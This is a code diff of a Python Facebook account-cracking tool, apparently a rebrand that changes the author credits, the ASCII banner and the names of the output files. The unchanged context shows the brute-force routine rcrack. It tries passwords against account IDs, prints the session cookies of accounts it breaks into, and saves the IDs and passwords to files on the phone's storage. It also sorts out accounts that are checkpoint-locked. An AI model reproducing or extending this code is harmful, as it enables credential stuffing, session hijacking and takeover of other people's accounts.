@@ -1,4 +1,4 @@
-#Source By : AWAIS
+#Source By : ANUM-MAFAI
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -101,16 +101,15 @@ logo =                                          ("""
 \033[1;35m       | $$  | $$| $$$/ \  $$$
 \033[1;35m       | $$  | $$| $$/   \  $$
 \033[1;32m       |__/  |__/|__/     \__/
-\033[1;37m================= \33[32;45mAWAIS\33[0;m =====================
-     Source By : WAQAS0
-\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :  \033[1;33mMEMER\33[0;m\033[1;32m && \033[1;33mAW4IS\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m AWAIS QARNI
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mFUCK-TEAM-KRS
+\033[1;37m================= \33[32;45mANUM\33[0;m =====================
+\033[1;32m     \033[1;33mCOPY PASTE BY\33[0;m   :\033[1;33mMEMER\33[0;m\033[1;32m && \033[1;33mANUM\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mANUM MAFAI
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mFUCK-YOU-ZUKU
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mKRS-LORA 🤣
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35mMAFAI-GRIL
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
-\033[1;37m================\033[1;32mWAQAS0 =====================
-       \33[37;41m\t WELLCOME TO AWAIS TOOL\33[0;m
+\033[1;37m================\033[1;32m ANUM =====================
+       \33[37;41m\t WELLCOME TO MAFAI TOOL\33[0;m
 \033[1;37m================== \33[32;45mOZA\33[0;m ======================\n""")
 loop = 0
 oks = []
@@ -262,22 +261,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m(AWAIS-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('\r\r\033[1;32m(AN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/AWAIS-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/ANUM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m(MEMER-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/MEMER-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\r\r\33[1;30m(MAFAI-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/MAFAI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s[AWAIS] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s[ANUM] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
